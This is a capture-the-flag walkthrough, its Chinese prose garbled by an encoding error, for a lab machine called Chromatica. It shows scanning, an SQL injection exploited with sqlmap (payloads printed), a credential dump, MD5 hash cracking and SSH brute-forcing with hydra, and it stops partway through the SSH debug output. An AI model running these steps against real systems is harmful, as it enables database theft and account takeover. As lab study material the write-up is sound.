**Êú¨Êú∫** IPÔºö192.168.205.141

---

### **1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã**

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST
Nmap scan report for 192.168.205.215
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
5353/tcp open  domain  dnsmasq 2.86
MAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü 22 (SSH) „ÄÅ 80 (HTTP) „ÄÅ5353(DNS)Á´ØÂè£„ÄÇ

### **2. Web ÊúçÂä°Êé¢Êµã‰∏éSQLÊ≥®ÂÖ•**

ÂØπ 80 Á´ØÂè£ÊÑüÂÖ¥Ë∂£ÔºåËÆøÈóÆ Web È°µÈù¢ÔºåÈùôÊÄÅÈ°µÊ≤°ÊúâÂà©Áî®‰ª∑ÂÄºÔºåÊâ´Êèè‰∏Ä‰∏ãÁªìÊûÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ whatweb http://192.168.205.215/
http://192.168.205.215/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.205.215], Script, Title[Chromatica|Coming Soon.....]  
```

Chromatica‰∏çÁü•ÈÅì‰ªÄ‰πà‰∏úË•øÔºåÊêú‰∏Ä‰∏ãÊºèÊ¥û

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit Chromatica      
Exploits: No Results
Shellcodes: No Results

```

Ê≤°ÊúâÔºåÈÇ£Â∞±ÁàÜÁ†¥‰∏Ä‰∏ãÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.215/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404                       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 4047]
/.html                (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 319] [--&gt; http://192.168.205.215/assets/]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.215/css/]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.215/js/]
/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.205.215/javascript/]
/robots.txt           (Status: 200) [Size: 36]
Progress: 25342 / 6369165 (0.40%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 29872 / 6369165 (0.47%)
===============================================================
Finished
===============================================================

```

`/robots.txt`ÁúãÁúãÊúâ‰ªÄ‰πà

![image](https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415)

![image](https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d)

Áõ¥Êé•ËÆøÈóÆË¢´Êã¶Êà™ÔºåÂä†‰∏äÁî®Êà∑‰ª£ÁêÜ`dev`ÊàëËøô‰ΩøÁî®ÁöÑÊòØ`hackbar`

![image](https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d)

ËÆøÈóÆÊàêÂäüÔºåÊúâËæìÂÖ•Ê°ÜËØïËØïsqlÊ≥®ÂÖ•

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev 
        ___
       __H__                                                                                                                         
 ___ ___[)]_____ ___ ___  {1.8.12#stable}                                                                                              
|_ -| . [,]     | .'| . |                                                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:28:16 /2024-12-30/

[14:28:16] [INFO] testing connection to the target URL
[14:28:16] [INFO] searching for forms
[1/1] Form:
GET http://192.168.205.215/dev-portal/search.php?city=
do you want to test this form? [Y/n/q] 
&gt; Y
Edit GET data [default: city=]: city=
do you want to fill blank fields with random values? [Y/n] Y
[14:28:16] [INFO] resuming back-end DBMS 'mysql' 
[14:28:16] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[14:28:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
[14:28:16] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv'                                                                                                         

[*] ending @ 14:28:16 /2024-12-30/

                                                                    
```

‰∏ÄÂèëÂÖ•È≠Ç

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev -D Chromatica -T users -C username,password --dump
        ___
       __H__                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.8.12#stable}                                                                                              
|_ -| . [']     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:31:19 /2024-12-30/

[14:31:19] [INFO] testing connection to the target URL
[14:31:19] [INFO] searching for forms
[1/1] Form:
GET http://192.168.205.215/dev-portal/search.php?city=
do you want to test this form? [Y/n/q] 
&gt; Y
Edit GET data [default: city=]: city=
do you want to fill blank fields with random values? [Y/n] Y
[14:31:19] [INFO] resuming back-end DBMS 'mysql' 
[14:31:19] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[14:31:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
[14:31:19] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'Chromatica'
[14:31:19] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: Chromatica
Table: users
[5 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| admin     | 8d06f5ae0a469178b28bbd34d1da6ef3 |
| dev       | 1ea6762d9b86b5676052d1ebd5f649d7 |
| user      | 3dd0f70a06e2900693fc4b684484ac85 |
| dev-selim | f220c85e3ff19d043def2578888fb4e5 |
| intern    | aaf7fb4d4bffb8c8002978a9c9c6ddc9 |
+-----------+----------------------------------+

[14:31:19] [INFO] table 'Chromatica.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.215/dump/Chromatica/users.csv'                                                                                                                             
[14:31:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv'                                                                                                         

[*] ending @ 14:31:19 /2024-12-30/

                                                      
```

ÊèêÂèñ‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp|awk -F ' ' '{print $2 ':' $4}' 
:
username:password
:
admin:8d06f5ae0a469178b28bbd34d1da6ef3
dev:1ea6762d9b86b5676052d1ebd5f649d7
user:3dd0f70a06e2900693fc4b684484ac85
dev-selim:f220c85e3ff19d043def2578888fb4e5
intern:aaf7fb4d4bffb8c8002978a9c9c6ddc9
:
:

```

Áõ¥Êé•Â§çÂà∂Â∞±Â•Ω‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp1
admin:8d06f5ae0a469178b28bbd34d1da6ef3
dev:1ea6762d9b86b5676052d1ebd5f649d7
user:3dd0f70a06e2900693fc4b684484ac85
dev-selim:f220c85e3ff19d043def2578888fb4e5
intern:aaf7fb4d4bffb8c8002978a9c9c6ddc9
                                             
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt tmp1 --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
keeptrying       (user)   
1g 0:00:00:00 DONE (2024-12-30 14:38) 1.785g/s 25613Kp/s 25613Kc/s 102933KC/s  fuckyooh21..*7¬°Vamos!
Use the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably
Session completed. 
                    
```

ÁàÜ‰∏çÂá∫Êù•‰∏¢[[crackstation](https://crackstation.net/)](https://crackstation.net/)ÁúãÊúâÊ≤°ÊúâÁªìÊûú

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp1|awk -F ':' '{print $2}'
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9

```

![image](https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d)

ÊûÑÂª∫‰∏Ä‰∏ã`user`Âíå`pass`ÁàÜÁ†¥ssh

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp1|awk -F ':' '{print $1}' &gt; user
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user                             
admin
dev
user
dev-selim
intern

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp1|awk -F ':' '{print $2}' &gt; pass
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat pass                             
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9

#ÁÑ∂ÂêéÊääcrackstationÁªìÊûúÊâãËæìËøõÂéª

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ vim pass
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat pass
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9
adm!n
flaghere
keeptrying
intern00
                
```

ÂΩìÁÑ∂‰Ω†ÊääÈÇ£‰∏™ÁΩëÊ†ºÂ§çÂà∂‰∏ãÊù•ËøáÊª§‰πüË°å

### 3.ssh ÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -L user -P pass ssh://192.168.205.215 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-30 14:44:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 60 login tries (l:5/p:12), ~1 try per task
[DATA] attacking ssh://192.168.205.215:22/
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'admin' - 1 of 60 [child 0] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'dev' - 2 of 60 [child 1] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'user' - 3 of 60 [child 2] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'dev-selim' - 4 of 60 [child 3] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern' - 5 of 60 [child 4] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '' - 6 of 60 [child 5] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '' - 7 of 60 [child 6] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '' - 8 of 60 [child 7] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '' - 9 of 60 [child 8] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '' - 10 of 60 [child 9] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'nimda' - 11 of 60 [child 10] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'ved' - 12 of 60 [child 11] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'resu' - 13 of 60 [child 12] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'miles-ved' - 14 of 60 [child 13] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'nretni' - 15 of 60 [child 14] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 16 of 60 [child 15] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 17 of 60 [child 16] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 18 of 60 [child 17] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 19 of 60 [child 18] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 20 of 60 [child 19] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 21 of 60 [child 20] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 22 of 60 [child 21] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 23 of 60 [child 22] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 24 of 60 [child 23] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 25 of 60 [child 24] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '3dd0f70a06e2900693fc4b684484ac85' - 26 of 60 [child 25] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '3dd0f70a06e2900693fc4b684484ac85' - 27 of 60 [child 26] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '3dd0f70a06e2900693fc4b684484ac85' - 28 of 60 [child 27] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '3dd0f70a06e2900693fc4b684484ac85' - 29 of 60 [child 28] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '3dd0f70a06e2900693fc4b684484ac85' - 30 of 60 [child 29] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 31 of 60 [child 30] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'f220c85e3ff19d043def2578888fb4e5' - 32 of 60 [child 31] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'f220c85e3ff19d043def2578888fb4e5' - 33 of 60 [child 32] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'f220c85e3ff19d043def2578888fb4e5' - 34 of 60 [child 33] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'f220c85e3ff19d043def2578888fb4e5' - 35 of 60 [child 34] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 36 of 60 [child 35] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 37 of 60 [child 36] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 38 of 60 [child 37] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 39 of 60 [child 38] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 40 of 60 [child 39] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'adm!n' - 41 of 60 [child 40] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'adm!n' - 42 of 60 [child 41] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'adm!n' - 43 of 60 [child 42] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'adm!n' - 44 of 60 [child 43] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'adm!n' - 45 of 60 [child 44] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'flaghere' - 46 of 60 [child 45] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'flaghere' - 47 of 60 [child 46] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'flaghere' - 48 of 60 [child 47] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'flaghere' - 49 of 60 [child 48] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'flaghere' - 50 of 60 [child 49] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'keeptrying' - 51 of 60 [child 50] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'keeptrying' - 52 of 60 [child 51] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'keeptrying' - 53 of 60 [child 52] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'keeptrying' - 54 of 60 [child 53] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'keeptrying' - 55 of 60 [child 54] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'intern00' - 56 of 60 [child 55] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'intern00' - 57 of 60 [child 56] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'intern00' - 58 of 60 [child 57] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'intern00' - 59 of 60 [child 58] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern00' - 60 of 60 [child 59] (0/0)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'dev-selim' - 61 of 79 [child 8] (1/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'miles-ved' - 62 of 79 [child 6] (2/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'user' - pass '3dd0f70a06e2900693fc4b684484ac85' - 63 of 79 [child 7] (3/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 64 of 79 [child 9] (4/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'user' - pass 'f220c85e3ff19d043def2578888fb4e5' - 65 of 80 [child 5] (5/20)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 66 of 80 [child 14] (6/20)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 67 of 81 [child 34] (7/21)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'intern00' - 68 of 82 [child 39] (8/22)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 69 of 82 [child 4] (9/22)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'intern00' - 70 of 83 [child 19] (10/23)
[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 71 of 84 [child 44] (11/24)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass '3dd0f70a06e2900693fc4b684484ac85' - 72 of 84 [child 29] (12/24)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass '3dd0f70a06e2900693fc4b684484ac85' - 73 of 85 [child 54] (13/25)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'flaghere' - 74 of 86 [child 5] (14/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'flaghere' - 75 of 86 [child 8] (15/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'flaghere' - 76 of 86 [child 23] (16/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'keeptrying' - 77 of 86 [child 18] (17/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'intern00' - 78 of 86 [child 33] (18/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern00' - 79 of 86 [child 28] (19/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 80 of 86 [child 43] (20/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 81 of 87 [child 53] (21/27)
[22][ssh] host: 192.168.205.215   login: dev   password: flaghere
[STATUS] attack finished for 192.168.205.215 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-30 14:44:53
                                                                                  
```

Êå∫Âø´ÁöÑÔºåÂ∞±86ÁßçÂèØËÉΩ

### 4.ÊèêÊùÉ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh dev@192.168.205.215                                                                                                         
dev@192.168.205.215's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.205.215 closed.
                                             
ÁøªËØëÔºö
ÊÇ®Â•ΩÔºå
Ê≠§Â∏êÊà∑‰∏çÊòØÁôªÂΩïÂ∏êÊà∑
Â¶ÇÊûúÊÇ®ÊÉ≥ÂØπÊ≠§Â∏êÊà∑ËøõË°åÁª¥Êä§ÔºåÊÇ®ÂøÖÈ°ª
ËÅîÁ≥ªÊÇ®ÁöÑÁÆ°ÁêÜÂëò
ÊàñË∑≥Âá∫ÊÄùÁª¥ÂÆöÂºè
ÂÅ∑ÊáíÂπ∂ËÅîÁ≥ªÊÇ®ÁöÑÁÆ°ÁêÜÂëò
ÊàñËÄÖ‰πüËÆ∏ÊÇ®Â∫îËØ•Â§öÂä®Âä®ËÑëÂ≠êÔºåÂëµÂëµÔºå
ÈóÆÂÄô

brightctf{ALM0ST_TH3R3_34897ffdf69}
‰∏é 192.168.205.215 ÁöÑËøûÊé•Â∑≤ÂÖ≥Èó≠„ÄÇ
```

ÊääÊàëË∏¢‰∏ãÁ∫ø‰∫ÜÔºåÁúãÁúãËØ¶ÁªÜ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh dev@192.168.205.215 -v
OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024
......
dev@192.168.205.215's password: 
Authenticated to 192.168.205.215 ([192.168.205.215]:22) using 'password'.
debug1: channel 0: new session [client-session] (inactive timeout: 0)
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: filesystem
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts for 192.168.205.215 / (none)
debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts2 for 192.168.205.215 / (none)
debug1: client_input_hostkeys: hostkeys file /home/kali/.ssh/known_hosts2 does not exist
debug1: client_input_hostkeys: no new or deprecated keys from server
debug1: Sending environment.
debug1: channel 0: setting env LANG = 'zh_CN.UTF-8'
debug1: pledge: fork
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
debug1: channel 0: free: client-session, nchannels 1
Connection to 192.168.205.215 closed.
Transferred: sent 3964, received 3860 bytes, in 0.4 seconds
Bytes per second: sent 11238.5, received 10943.6
debug1: Exit status 0
                   

ÁøªËØëÔºö
‰ΩøÁî®‚ÄúÂØÜÁ†Å‚ÄùÂêë 192.168.205.215 ([192.168.205.215]:22) ËøõË°åË∫´‰ªΩÈ™åËØÅ„ÄÇ
debug1ÔºöÈÄöÈÅì 0ÔºöÊñ∞‰ºöËØù [client-session]ÔºàÈùûÊ¥ªÂä®Ë∂ÖÊó∂Ôºö0Ôºâ
debug1ÔºöËØ∑Ê±Ç no-more-sessions@openssh.com
debug1ÔºöËøõÂÖ•‰∫§‰∫íÂºè‰ºöËØù„ÄÇ
debug1ÔºöÊâøËØ∫ÔºöÊñá‰ª∂Á≥ªÁªü
debug1Ôºöclient_input_global_requestÔºörtype hostkeys-00@openssh.com want_reply 0
debug1Ôºöclient_input_hostkeysÔºöÂú® /home/kali/.ssh/known_hosts ‰∏≠ÊêúÁ¥¢ 192.168.205.215 / (Êó†)
